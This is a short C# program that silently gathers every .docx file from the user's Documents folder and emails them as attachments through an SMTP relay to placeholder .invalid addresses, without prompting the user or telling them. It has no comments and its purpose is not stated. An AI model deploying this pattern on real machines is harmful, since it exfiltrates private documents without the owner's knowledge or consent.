using System;
using System.IO;
using System.Net.Mail;

class DocumentMailer {
    static void Main() {
        var message = new MailMessage("sender@example.invalid", "receiver@example.invalid");
        message.Subject = "report";
        var folder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        foreach (var document in Directory.GetFiles(folder, "*.docx"))
            message.Attachments.Add(new Attachment(document));
        using var mailer = new SmtpClient("relay.example.invalid", 587);
        mailer.EnableSsl = true;
        mailer.Send(message);
    }
}
